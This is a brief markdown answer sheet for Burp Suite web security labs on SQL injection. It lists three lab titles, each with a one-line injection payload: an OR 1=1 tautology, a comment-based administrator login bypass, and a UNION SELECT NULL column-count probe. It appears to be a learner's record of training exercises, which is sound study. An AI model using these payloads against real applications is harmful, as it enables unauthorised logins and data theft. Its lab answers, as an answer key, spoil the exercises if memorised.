# Burpsuite Lab Answers
## SQL injection 
### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
#### Solution: '+OR+1=1--
<img src="images/SQL-1.png">

### SQL injection vulnerability allowing login bypass
#### Solution: administrator'--
<img src="images/SQL-2.png">

### SQL injection UNION attack, determining the number of columns returned by the query
#### Solution: 'UNION SELECT NULL, NULL, NULL--
<img src="images/SQL-3.png">
